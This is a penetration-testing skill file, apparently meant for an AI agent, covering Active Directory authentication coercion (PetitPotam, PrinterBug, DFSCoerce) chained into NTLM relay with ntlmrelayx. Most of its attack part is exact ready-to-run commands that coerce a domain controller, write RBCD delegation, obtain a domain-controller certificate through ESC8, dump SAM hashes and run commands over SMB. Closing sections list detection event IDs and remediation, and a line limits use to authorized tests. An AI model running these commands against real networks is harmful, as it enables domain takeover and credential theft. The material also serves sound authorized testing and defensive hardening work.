---
name: coercion-ntlm-relay
description: Authentication coercion (PetitPotam MS-EFSR, PrinterBug MS-RPRN, DFSCoerce MS-DFSNM) chained into NTLM relay (impacket ntlmrelayx) toward LDAP, AD CS web enrollment (ESC8), or SMB. Use when SMB signing is not enforced or LDAP channel binding is missing, and you want to force a privileged machine account to authenticate to your relay and turn that into RBCD, a DCSync-capable ACL grant, or a certificate. Includes the exact Coercer/ntlmrelayx commands, requirements, detection, and remediation.
---

# Coercion + NTLM Relay

Two techniques that combine into one of the most reliable domain-compromise chains: **force** a target (usually a Domain Controller's machine account) to authenticate to a host you control, then **relay** that authentication to a service that lacks the protection to reject it. No credential cracking involved; you are borrowing a live authentication.

The chain only works when a relay target is unprotected:
- **Relay to LDAP/LDAPS** requires **LDAP signing not enforced** and **channel binding (EPA) absent**.
- **Relay to SMB** requires **SMB signing not enforced** on the destination.
- **Relay to AD CS web enrollment (ESC8)** requires the HTTP enrollment endpoint up **without EPA**.

Check signing posture first:
```
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt        # hosts without SMB signing
nxc ldap 10.0.0.10 -u user -p 'Password123' -M ldap-checker   # LDAP signing / channel binding state
```

---

## Part 1: Coercion

You need a way to make a privileged account authenticate outbound to your IP. Three RPC-based coercion methods, each abusing a different protocol. All fire the target's **machine account** ($) authentication at you.

### PetitPotam: MS-EFSR (Encrypting File System Remote)

**MITRE ATT&CK:** T1187 (Forced Authentication)

Abuses the EFSRPC interface (`EfsRpcOpenFileRaw` and related). Often works unauthenticated against unpatched DCs; authenticated on patched ones.
```
Coercer coerce -u user -p 'Password123' -d CORP.LOCAL \
  -l <YOUR_IP> -t 10.0.0.10 --filter-method-name EfsRpc
```
Classic standalone tool:
```
python3 PetitPotam.py -u user -p 'Password123' -d CORP.LOCAL <YOUR_IP> 10.0.0.10
```

### PrinterBug: MS-RPRN (Print System Remote Protocol)

**MITRE ATT&CK:** T1187

Abuses `RpcRemoteFindFirstPrinterChangeNotificationEx` via the Spooler service. Works wherever the Print Spooler is running (still common on DCs).
```
Coercer coerce -u user -p 'Password123' -d CORP.LOCAL \
  -l <YOUR_IP> -t 10.0.0.10 --filter-protocol-name MS-RPRN
```
Standalone:
```
python3 dementor.py <YOUR_IP> 10.0.0.10 -u user -p 'Password123' -d CORP.LOCAL
```

### DFSCoerce: MS-DFSNM (Distributed File System Namespace Management)

**MITRE ATT&CK:** T1187

Abuses `NetrDfsAddStdRoot`/`NetrDfsRemoveStdRoot`. Useful when EFSR and Spooler are patched/disabled, because DFSNM is harder to turn off on a DC.
```
Coercer coerce -u user -p 'Password123' -d CORP.LOCAL \
  -l <YOUR_IP> -t 10.0.0.10 --filter-protocol-name MS-DFSNM
```
Standalone:
```
python3 dfscoerce.py -u user -p 'Password123' -d CORP.LOCAL <YOUR_IP> 10.0.0.10
```

`Coercer` sweeps all methods at once if you drop the filters, which is handy to find whatever is not patched.

---

## Part 2: NTLM Relay (impacket ntlmrelayx)

Stand up the relay before you coerce. The coerced authentication lands on ntlmrelayx, which forwards it to your chosen target.

### Relay to LDAP: grant RBCD or DCSync-capable rights

**MITRE ATT&CK:** T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS/relay) / T1187

Relaying a DC's machine account to LDAP lets you write directory objects as that machine. The `--delegate-access` flow configures RBCD so you can then S4U to the coerced host (Kerberos skill). Requires LDAP signing not enforced and channel binding absent.
```
ntlmrelayx.py -t ldaps://10.0.0.10 --delegate-access --no-dump --no-da -smb2support
```
After the relay writes RBCD, S4U (see Kerberos skill). A relayed DC can also be pushed to grant a controlled principal replication rights (the WriteDACL-on-domain-head path in the ACL skill), which then enables DCSync as a post-compromise step.

### Relay to AD CS web enrollment: ESC8

**MITRE ATT&CK:** T1557.001 / T1187

Relay the coerced DC machine account to the CA's HTTP web-enrollment endpoint and enroll a certificate as that DC. Then PKINIT the cert to a TGT (AD CS skill). Requires the web-enrollment endpoint up without EPA.
```
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```
Coerce a DC (PetitPotam) into this relay, take the issued `.pfx`, then `certipy auth -pfx ...`.

### Relay to SMB: remote command / secrets

**MITRE ATT&CK:** T1557.001

Relay to a member server whose SMB signing is not enforced to dump SAM or run a command as the relayed account.
```
ntlmrelayx.py -tf relay_targets.txt -smb2support -c 'whoami'
ntlmrelayx.py -t smb://10.0.0.50 -smb2support --dump-sam
```

---

## Full chain (order of operations)

1. Confirm an unprotected relay target (`--gen-relay-list`, LDAP signing/CBT check).
2. Start `ntlmrelayx.py` pointed at LDAP / AD CS / SMB.
3. Coerce the DC (or other privileged host) to authenticate to your relay IP with Coercer/PetitPotam/PrinterBug/DFSCoerce.
4. Consume the result: RBCD → S4U (Kerberos skill), ESC8 cert → PKINIT (AD CS skill), or SMB action.

---

## Detection (Event IDs)

- **4624** (successful logon) with **Logon Type 3** and **NTLM** authentication package, where the account is a **machine account** ($) authenticating to a host it has no business reaching (the relay endpoint). Machine-to-machine NTLM to a non-standard destination is the core signal.
- **4662** on the domain object if the relay wrote replication rights; **5136** for the RBCD / DACL / owner writes the relayed session performs (see ACL skill).
- **4886/4887** on the CA for the ESC8 certificate request/issuance.
- **5145** (network share object checked) and Spooler/DFS RPC activity on the coerced host around the coercion call.
- Defender for Identity raises alerts for suspected NTLM relay and for the coercion RPC patterns.

---

## Remediation to write up

- **Enforce SMB signing** (require, not just enable) on all hosts, DCs included. This alone breaks SMB relay.
- **Enforce LDAP signing** and enable **LDAP channel binding (EPA)** on Domain Controllers. This breaks the LDAP relay path (Microsoft's hardening, e.g. the LDAP channel-binding/signing enforcement updates).
- **Enable EPA and require HTTPS** on AD CS web enrollment; disable HTTP; disable web enrollment if unused. This closes ESC8.
- **Restrict/patch the coercion surface:** apply the PetitPotam patch, **disable the Print Spooler on DCs and servers that do not print**, and apply DFSCoerce mitigations. Coercion methods are many, so relay-target hardening (signing/EPA) is the durable fix.
- **`RestrictReceivingNTLMTraffic` / `RestrictSendingNTLMTraffic`** GPOs to constrain NTLM, and ultimately move toward disabling NTLM where feasible.
- Put Tier-0 accounts in **Protected Users** so their NTLM cannot be relayed.
- Alert on machine-account NTLM logons to unexpected hosts (4624 type 3 NTLM from `$` accounts).

Only run coercion and relay against systems you are explicitly authorized to test. Coercion generates real authentication traffic and can disrupt services. Use lab/generic IPs, hostnames and CA names in write-ups.

---

## Reference

- MS-RPRN / MS-EFSR / MS-DFSNM coercion: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/
- NTLM relay: https://www.thehacker.recipes/ad/movement/ntlm/relay
- ESC8 (relay to AD CS web enrollment): https://www.thehacker.recipes/ad/movement/adcs/web-endpoints
